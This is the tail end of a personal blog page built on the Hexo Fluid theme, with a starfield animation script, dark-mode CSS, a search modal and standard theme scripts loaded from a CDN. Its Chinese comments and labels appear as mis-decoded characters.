        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>ç›®å½•</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">æœç´¢</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">å…³é”®è¯</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
      <div class="col-lg-7 mx-auto nopadding-x-md">
        <div class="container custom mx-auto">
          <canvas id="starfield-canvas"></canvas> <script>
  (function() {
    var canvas = document.getElementById('starfield-canvas');
    var ctx = canvas.getContext('2d');
    var stars = [];
    var meteors = [];
    var numStars = 150;

    // åˆå§‹åŒ–ç”»å¸ƒ
    function init() {
      canvas.width = window.innerWidth;
      canvas.height = window.innerHeight;
      stars = [];
      meteors = [];
      for (var i = 0; i < numStars; i++) {
        stars.push({
          x: Math.random() * canvas.width,
          y: Math.random() * canvas.height,
          r: Math.random() * 1.5,
          speed: Math.random() * 0.2 + 0.1
        });
      }
    }

    // åˆ›å»ºå•ä¸ªæµæ˜Ÿ
    function createMeteor() {
      meteors.push({
        x: Math.random() * canvas.width * 1.5, // ä»å³ä¾§è¿›å…¥
        y: Math.random() * canvas.height * 0.5 - 200, // ä»é¡¶éƒ¨éšæœºé«˜åº¦
        len: Math.random() * 80 + 50, // å°¾å·´é•¿åº¦
        speed: Math.random() * 6 + 4, // é£è¡Œé€Ÿåº¦
        size: Math.random() * 1 + 0.5 // æµæ˜Ÿå¤´å¤§å°
      });
    }

    function draw() {
      ctx.clearRect(0, 0, canvas.width, canvas.height);
      
      // ç»˜åˆ¶æ™®é€šèƒŒæ™¯æ˜Ÿ
      ctx.fillStyle = "rgba(220, 220, 220, 0.8)";
      ctx.beginPath();
      for (var i = 0; i < numStars; i++) {
        var s = stars[i];
        ctx.moveTo(s.x, s.y);
        ctx.arc(s.x, s.y, s.r, 0, Math.PI * 2);
        // ç¼“æ…¢ä¸‹è½åŠ¨æ€
        s.y += s.speed;
        if (s.y > canvas.height) s.y = 0;
      }
      ctx.fill();

      // ç»˜åˆ¶æµæ˜Ÿ
      for (var j = 0; j < meteors.length; j++) {
        var m = meteors[j];
        // æµæ˜Ÿæ˜¯ä¸€ä¸ªæ¸å˜çº¿æ¡
        var grad = ctx.createLinearGradient(m.x, m.y, m.x + m.len, m.y - m.len);
        grad.addColorStop(0, "rgba(255, 255, 255, 1)"); // å¤´
        grad.addColorStop(1, "rgba(255, 255, 255, 0)"); // å°¾å·´æ¶ˆå¤±
        
        ctx.strokeStyle = grad;
        ctx.lineWidth = m.size;
        ctx.lineCap = "round";
        ctx.beginPath();
        ctx.moveTo(m.x, m.y);
        ctx.lineTo(m.x - m.len, m.y + m.len); // å‘å·¦ä¸‹æ–¹åˆ’è¿‡
        ctx.stroke();

        // æ›´æ–°æµæ˜Ÿä½ç½®
        m.x -= m.speed;
        m.y += m.speed;

        // ç§»é™¤å‡ºç•Œçš„æµæ˜Ÿ
        if (m.y > canvas.height + 100 || m.x < -100) {
          meteors.splice(j, 1);
          j--;
        }
      }

      // æ§åˆ¶æµæ˜Ÿç”Ÿæˆçš„é¢‘ç‡ (æ•°å€¼è¶Šå¤§æµæ˜Ÿè¶Šå°‘)
      if (Math.random() < 0.015) { 
        createMeteor();
      }
    }

    function tick() { draw(); requestAnimationFrame(tick); }
    init(); tick();
    window.addEventListener('resize', init);
  })();
</script>
<script>
  (function() {
    function injectHomeText() {
      if (window.location.pathname === '/' || window.location.pathname === '/index.html') {
        var target = document.querySelector('.header-inner .full-bg-img .banner-text'); 
        if (target && !document.getElementById('custom-text-container')) {
          var container = document.createElement('div');
          container.id = 'custom-text-container';
          
          var line1 = document.createElement('div');
          line1.className = 'custom-animated-line';
          line1.innerHTML = 'ç”µè„‘ç«¯å¯ä»¥çœ‹è§çœ‹æ¿å¨˜å“¦'; 
          
          var line2 = document.createElement('div');
          line2.className = 'custom-animated-line';
          line2.style.fontSize = '0.9rem';
          line2.style.marginTop = '10px';
          line2.innerHTML = 'âœ¨ åˆ‡æˆæ·±è‰²æ¨¡å¼å§ï¼Œä¸Šé¢å¯ä»¥æ”¹çš„ âœ¨'; 

          container.appendChild(line1);
          container.appendChild(line2);
          target.appendChild(container);
          
          setTimeout(function() {
            container.classList.add('start-animation');
          }, 2800); 
        }
      }
    }
    injectHomeText();
    window.addEventListener('load', injectHomeText);
  })();
</script>
<style>
  /* æ˜Ÿç©ºç”»å¸ƒåŸºç¡€æ ·å¼ */
  #starfield-canvas {
    position: fixed;
    top: 0; left: 0; width: 100%; height: 100%;
    z-index: -1; pointer-events: none; background-color: transparent;
  }

  /* --- æš—é»‘æ¨¡å¼ï¼šé€è§†æ˜Ÿç©ºé€»è¾‘ --- */
  [data-user-color-scheme="dark"] #starfield-canvas {
    display: block;
    background-color: #05080a; 
  }
  [data-user-color-scheme="dark"] #board, 
  [data-user-color-scheme="dark"] .modal-content,
  [data-user-color-scheme="dark"] .footer-inner,
  [data-user-color-scheme="dark"] .navbar {
    background-color: rgba(13, 17, 23, 0.4) !important;
    backdrop-filter: none !important;
    -webkit-backdrop-filter: none !important;
    border: 1px solid rgba(255, 255, 255, 0.05);
  }
  [data-user-color-scheme="dark"] .full-bg-img, 
  [data-user-color-scheme="dark"] #banner,
  [data-user-color-scheme="dark"] .mask-flex {
    background-image: none !important;
    background-color: transparent !important;
  }

  /* --- æ˜äº®æ¨¡å¼ï¼šå…¨é¡µé¢æ–‡å­—æ¸…æ™°åº¦ä¼˜åŒ– --- */
  [data-user-color-scheme="light"] #starfield-canvas {
    display: none;
  }
  
  [data-user-color-scheme="light"] .banner-text .h2,
  [data-user-color-scheme="light"] .banner-text h1,
  [data-user-color-scheme="light"] .index-info .typed-text,
  [data-user-color-scheme="light"] .custom-animated-line {
    color: #ffffff !important;
    text-shadow: 0 0 10px rgba(0, 0, 0, 0.8), 2px 2px 4px rgba(0, 0, 0, 1) !important;
    font-weight: bold !important;
  }

  [data-user-color-scheme="light"] .navbar {
    background-color: rgba(0, 0, 0, 0.15) !important;
    backdrop-filter: blur(5px);
  }
  [data-user-color-scheme="light"] .navbar .nav-link,
  [data-user-color-scheme="light"] .navbar .navbar-brand {
    color: #fff !important;
    text-shadow: 1px 1px 3px rgba(0,0,0,0.8) !important;
  }
  [data-user-color-scheme="light"] .mask-flex {
    background-color: rgba(0, 0, 0, 0.3) !important;
  }

  /* --- åŒè¡Œæ–‡å­—åŠ¨æ•ˆè¡¥ä¸ --- */
  #custom-text-container {
    margin-top: 1.5rem;
    opacity: 0;
    visibility: hidden;
    transform: scale(0.9) translateY(10px);
    text-align: center;
  }

  .custom-animated-line {
    font-size: 1.1rem;
    font-weight: 500;
    color: var(--text-color);
  }

  .start-animation {
    visibility: visible !important;
    animation: fadeInZoomCustom 1.5s ease-out forwards;
  }

  @keyframes fadeInZoomCustom {
    0% { opacity: 0; transform: scale(0.9) translateY(10px); }
    100% { opacity: 1; transform: scale(1) translateY(0); }
  }

  /* ç‰ˆæƒå£°æ˜åŒº */
  .post-copyright {
    margin-top: 3rem; padding: 1rem 1.5rem;
    border-left: 3px solid #3498db !important;
    background-color: var(--board-bg-color);
  }
  .post-copyright-license { display: none !important; }

  /* --- Waline è¯„è®ºåŒºé€è§†é€‚é… --- */
[data-user-color-scheme="dark"] .wl-content, [data-user-color-scheme="dark"] .wl-panel, [data-user-color-scheme="dark"] .wl-header, [data-user-color-scheme="dark"] .wl-footer {
  background: transparent !important;
  border-color: rgba(255, 255, 255, 0.1) !important;
  color: #ddd !important;
}
[data-user-color-scheme="dark"] .wl-editor {
  background: rgba(255, 255, 255, 0.05) !important;
}
[data-user-color-scheme="dark"] .wl-btn {
  background: rgba(52, 152, 219, 0.4) !important;
  color: #fff !important;
  border: none;
} </style>
        </div>
      </div>
    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  
  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script  src="/js/local-search.js" ></script>





<!-- ä¸»é¢˜çš„å¯åŠ¨é¡¹ï¼Œå°†å®ƒä¿æŒåœ¨æœ€åº•éƒ¨ -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">åšå®¢åœ¨å…è®¸ JavaScript è¿è¡Œçš„ç¯å¢ƒä¸‹æµè§ˆæ•ˆæœæ›´ä½³</div>
  </noscript>
</body>
</html>
